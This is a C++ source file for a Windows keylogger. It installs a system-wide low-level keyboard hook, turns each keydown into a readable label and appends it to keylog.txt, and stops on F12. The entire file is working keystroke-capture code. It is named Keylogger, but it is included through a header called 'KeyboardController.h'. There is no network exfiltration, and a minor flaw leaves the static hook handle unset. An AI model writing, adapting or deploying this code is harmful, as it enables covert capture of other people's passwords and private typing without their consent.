#include "KeyboardController.h"

HHOOK Keylogger::_hook = NULL;

void Keylogger::logKeystroke(int key) {
    ofstream logfile;
    logfile.open("keylog.txt", ios::app);

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logfile << "[ENTER]";
    else if (key == VK_SPACE)
        logfile << " ";
    else if (key == VK_TAB)
        logfile << "[TAB]";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        logfile << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logfile << "[CTRL]";
    else if (key == VK_ESCAPE)
        logfile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logfile << ".";
    // Log alphabetic keys (A-Z) and numbers (0-9) as the character itself.
    else if (key >= 'A' && key <= 'Z')
        logfile << char(key); // Log the uppercase letter pressed.
    else if (key >= '0' && key <= '9')
        logfile << char(key); // Log the number pressed.

    else 
        logfile << "[" << key << "]"; // Log other keys using their virtual keycode. 
    logfile.close();
}

LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        
        if (key == VK_F12) {
            PostQuitMessage(0);
            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        logKeystroke(key);
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Keylogger::Solve() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

}